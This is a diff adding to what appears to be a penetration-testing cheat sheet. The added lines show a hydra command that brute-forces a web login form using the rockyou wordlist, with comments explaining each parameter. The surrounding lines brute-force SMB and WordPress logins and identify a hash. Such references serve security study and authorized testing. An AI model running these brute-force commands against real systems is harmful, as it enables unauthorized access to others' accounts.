@@ -416,6 +416,16 @@ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
 # Hydra brute force a Wordpress admin login
 hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 
+# Sampe Webform 2
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP-Target> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+##The login page is only /, i.e., the main IP address.
+##The username is the form field where the username is entered
+##The specified username(s) will replace ^USER^
+##The password is the form field where the password is entered
+##The provided passwords will be replacing ^PASS^
+##Finally, F=incorrect is a string that appears in the server reply when the login fails
+
 
 # hashid indentification hash funtion
 hashid 5f4dcc3b5aa765d61d8327deb882cf99
